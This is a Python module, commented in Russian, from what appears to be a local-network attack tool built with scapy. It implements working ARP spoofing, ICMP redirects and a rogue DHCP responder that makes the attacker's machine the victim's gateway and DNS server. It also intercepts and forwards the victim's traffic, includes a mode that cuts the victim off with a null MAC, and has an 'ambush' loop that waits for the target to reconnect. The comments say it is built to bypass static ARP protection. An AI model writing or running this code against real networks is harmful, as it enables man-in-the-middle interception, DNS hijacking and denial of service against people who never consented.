"""
Attack — ARP-spoof, ICMP Redirect, DHCP-spoof, мониторинг.

Содержит фоновые процессы:
- start_combined_attack — ARP-spoof + DHCP-spoof одновременно (одна кнопка)
- start_monitor_process — ARP-spoof + перехват + форвардинг
"""

from __future__ import annotations

import time
from threading import Thread
from typing import Optional, Callable

from scapy.layers.inet import ICMP, IP, UDP
from scapy.layers.l2 import ARP, Ether
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.sendrecv import srp, sendp, send, sniff

from core.forwarding import toggle_forwarding
from core.monitor import start_monitor_sniffer

# Константы периодичности
BROADCAST_INTERVAL = 20
CHECK_INTERVAL = 100


def _wait_for_target(is_attacking_ref: Callable[[], bool],
                     target_info: dict,
                     on_monitor_log: Optional[Callable[[str], None]]) -> None:
    """Ждать возвращения цели в сеть (режим «Засада»)."""
    while is_attacking_ref():
        try:
            ans = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff")
                / ARP(pdst=target_info["ip"]),
                timeout=1, verbose=0,
            )[0]
            if ans:
                target_info["mac"] = ans[0][1].hwsrc
                if on_monitor_log:
                    on_monitor_log(
                        f"[+] Цель вернулась! Новый MAC: "
                        f"{target_info['mac']}"
                    )
                return
        except Exception:
            pass
        time.sleep(1)


def _make_dhcp_handler(is_attacking_ref: Callable[[], bool],
                       target_info: dict,
                       my_ip: str, my_mac: str,
                       on_attack_log: Optional[Callable[[str], None]],
                       on_monitor_log: Optional[Callable[[str], None]]) -> Callable:
    """Создать обработчик DHCP-пакетов для цели."""
    t_ip = target_info["ip"]
    t_mac = target_info["mac"]

    def dhcp_handle(pkt) -> None:
        """Обработчик DHCP-пакетов — отвечает быстрее роутера."""
        if not is_attacking_ref():
            return
        if not pkt.haslayer(BOOTP):
            return

        client_mac = pkt[Ether].src
        if client_mac.lower() != t_mac.lower():
            return

        dhcp_opts = pkt[DHCP].options
        dhcp_type = None
        for opt in dhcp_opts:
            if isinstance(opt, tuple) and opt[0] == "message-type":
                dhcp_type = opt[1]
                break
        if dhcp_type is None:
            return

        if dhcp_type == 1:  # Discover
            if on_attack_log:
                on_attack_log(f"  📡 DHCP Discover от {t_ip}")

            offer = (
                Ether(dst=t_mac, src=my_mac)
                / IP(src=my_ip, dst="255.255.255.255")
                / UDP(sport=67, dport=68)
                / BOOTP(
                    op=2, yiaddr=t_ip, siaddr=my_ip,
                    giaddr="0.0.0.0",
                    chaddr=[bytes.fromhex(t_mac.replace(":", ""))],
                )
                / DHCP(options=[
                    ("message-type", "offer"),
                    ("server_id", my_ip),
                    ("subnet_mask", "255.255.255.0"),
                    ("router", my_ip),          # Gateway = мы!
                    ("name_server", my_ip),
                    ("domain", "local"),
                    ("lease_time", 60),
                    ("end",)
                ])
            )
            sendp(offer, verbose=False)
            if on_attack_log:
                on_attack_log(f"  ✅ DHCP Offer: Gateway={my_ip}")

        elif dhcp_type == 3:  # Request
            req_server = None
            for opt in dhcp_opts:
                if isinstance(opt, tuple) and opt[0] == "server_id":
                    req_server = opt[1]
                    break
            if req_server != my_ip:
                return  # Выбрала роутер — игнорируем

            if on_attack_log:
                on_attack_log(f"  📡 DHCP Request от {t_ip} — выбрала нас!")

            ack = (
                Ether(dst=t_mac, src=my_mac)
                / IP(src=my_ip, dst="255.255.255.255")
                / UDP(sport=67, dport=68)
                / BOOTP(
                    op=2, yiaddr=t_ip, siaddr=my_ip,
                    giaddr="0.0.0.0",
                    chaddr=[bytes.fromhex(t_mac.replace(":", ""))],
                )
                / DHCP(options=[
                    ("message-type", "ack"),
                    ("server_id", my_ip),
                    ("subnet_mask", "255.255.255.0"),
                    ("router", my_ip),
                    ("name_server", my_ip),
                    ("domain", "local"),
                    ("lease_time", 60),
                    ("end",)
                ])
            )
            sendp(ack, verbose=False)
            if on_attack_log:
                on_attack_log(
                    f"  ✅ DHCP Ack! {t_ip} теперь шлёт трафик через нас"
                )
            if on_monitor_log:
                on_monitor_log(
                    f"[*] DHCP: {t_ip} перехвачен через DHCP"
                )

    return dhcp_handle


def start_combined_attack(is_attacking_ref: Callable[[], bool],
                          target_info: dict,
                          router_ip: str, router_mac: str,
                          my_ip: str, my_mac: str,
                          on_attack_log: Optional[Callable[[str], None]],
                          on_monitor_log: Optional[Callable[[str], None]]) -> None:
    """
    Комбинированная атака: ARP-spoof + DHCP-spoof одновременно.

    ARP-spoof работает постоянно (как обычно).
    DHCP-сниффер ждёт в фоне — если жертва запросит IP,
    мы ответим быстрее роутера и выдадим себя как шлюз.

    Это обходит статический ARP (arp -s), потому что жертва
    получает наш IP как Gateway через DHCP и не использует ARP.
    """
    t_ip = target_info["ip"]
    t_mac = target_info["mac"]

    # Сохраняем информацию о нас для monitor.packet_callback
    target_info["_my_mac"] = my_mac
    target_info["_router_mac"] = router_mac
    target_info["_my_ip"] = my_ip

    toggle_forwarding(True)

    # ARP-spoof пакеты (fake_mac = чёрная дыра для обрыва связи)
    fake_mac = "00:00:00:00:00:00"
    to_victim = (
        Ether(dst=t_mac)
        / ARP(op=2, pdst=t_ip, hwdst=t_mac,
              psrc=router_ip, hwsrc=fake_mac)
    )
    to_router = (
        Ether(dst=router_mac)
        / ARP(op=2, pdst=router_ip, hwdst=router_mac,
              psrc=t_ip, hwsrc=fake_mac)
    )
    broadcast_p = (
        Ether(dst="ff:ff:ff:ff:ff:ff")
        / ARP(op=2, pdst=t_ip, psrc=router_ip)
    )
    icmp_p = (
        IP(src=router_ip, dst=t_ip)
        / ICMP(type=5, code=1, gw=my_ip)
        / IP(src=t_ip, dst="8.8.8.8")
    )

    # DHCP-сниффер в отдельном потоке
    dhcp_handler = _make_dhcp_handler(
        is_attacking_ref, target_info, my_ip, my_mac,
        on_attack_log, on_monitor_log,
    )
    dhcp_thread = Thread(
        target=lambda: sniff(
            filter="udp and (port 67 or port 68)",
            prn=dhcp_handler,
            store=0,
        ),
        daemon=True,
    )
    dhcp_thread.start()

    if on_attack_log:
        on_attack_log(
            f"[*] Атака: {t_ip} | ARP-spoof + DHCP-spoof"
        )

    # Основной цикл: ARP-spoof
    while is_attacking_ref():
        try:
            sendp(to_victim, verbose=False)
            sendp(to_router, verbose=False)

            pkts = target_info.get("packets", 0)

            if pkts % BROADCAST_INTERVAL == 0:
                sendp(broadcast_p, verbose=False)
                send(icmp_p, verbose=False)

            target_info["packets"] = pkts + 2

            if pkts % CHECK_INTERVAL == 0:
                check = srp(
                    Ether(dst=t_mac) / ARP(pdst=t_ip),
                    timeout=0.2, verbose=0,
                )[0]
                if not check:
                    if on_monitor_log:
                        on_monitor_log(
                            f"\n[!] Цель {t_ip} пропала. Ухожу в ЗАСАДУ..."
                        )
                    _wait_for_target(is_attacking_ref, target_info, on_monitor_log)

            time.sleep(0.05)
        except Exception:
            continue

    toggle_forwarding(False)


def start_monitor_process(is_attacking_ref: Callable[[], bool],
                          target_info: dict,
                          found_devices: list,
                          query_log: list,
                          router_ip: str, router_mac: str,
                          my_ip: str, my_mac: str,
                          on_attack_log: Optional[Callable[[str], None]],
                          on_monitor_log: Optional[Callable[[str], None]]) -> None:
    """Запустить ARP-spoof + перехват + пересылку в фоновом потоке."""
    t_ip = target_info["ip"]
    t_mac = target_info["mac"]

    # Сохраняем информацию о нас для monitor.packet_callback
    target_info["_my_mac"] = my_mac
    target_info["_router_mac"] = router_mac
    target_info["_my_ip"] = my_ip

    toggle_forwarding(True)

    to_victim = (
        Ether(dst=t_mac)
        / ARP(op=2, pdst=t_ip, psrc=router_ip, hwsrc=my_mac)
    )
    to_router = (
        Ether(dst=router_mac)
        / ARP(op=2, pdst=router_ip, psrc=t_ip, hwsrc=my_mac)
    )

    if on_monitor_log:
        on_monitor_log(f"[*] МОНИТОРИНГ: {t_ip} под наблюдением...")

    # Сниффер трафика
    start_monitor_sniffer(
        t_ip, is_attacking_ref, target_info,
        found_devices, query_log, on_monitor_log,
    )

    # DHCP-сниффер (на случай, если жертва обновит IP)
    dhcp_handler = _make_dhcp_handler(
        is_attacking_ref, target_info, my_ip, my_mac,
        on_attack_log, on_monitor_log,
    )
    dhcp_thread = Thread(
        target=lambda: sniff(
            filter="udp and (port 67 or port 68)",
            prn=dhcp_handler,
            store=0,
        ),
        daemon=True,
    )
    dhcp_thread.start()

    # ARP-spoof цикл
    while is_attacking_ref():
        try:
            sendp(to_victim, verbose=False)
            sendp(to_router, verbose=False)
            time.sleep(1.5)
        except Exception:
            continue

    toggle_forwarding(False)


def stop_dhcp_spoof(router_ip: str, router_mac: str,
                    target_info: dict,
                    on_attack_log: Optional[Callable[[str], None]]) -> None:
    """Остановить DHCP спуфинг — восстановить шлюз."""
    try:
        t_ip = target_info.get("ip")
        t_mac = target_info.get("mac")
        if not t_ip or not t_mac:
            return

        restore = (
            Ether(dst=t_mac, src=router_mac)
            / IP(src=router_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(
                op=2, yiaddr=t_ip, siaddr=router_ip,
                chaddr=[bytes.fromhex(t_mac.replace(":", ""))],
            )
            / DHCP(options=[
                ("message-type", "ack"),
                ("server_id", router_ip),
                ("subnet_mask", "255.255.255.0"),
                ("router", router_ip),
                ("lease_time", 86400),
                ("end",)
            ])
        )
        sendp(restore, verbose=False)
        if on_attack_log:
            on_attack_log(
                f"[*] DHCP: Восстановил шлюз {t_ip} → {router_ip}"
            )
    except Exception:
        pass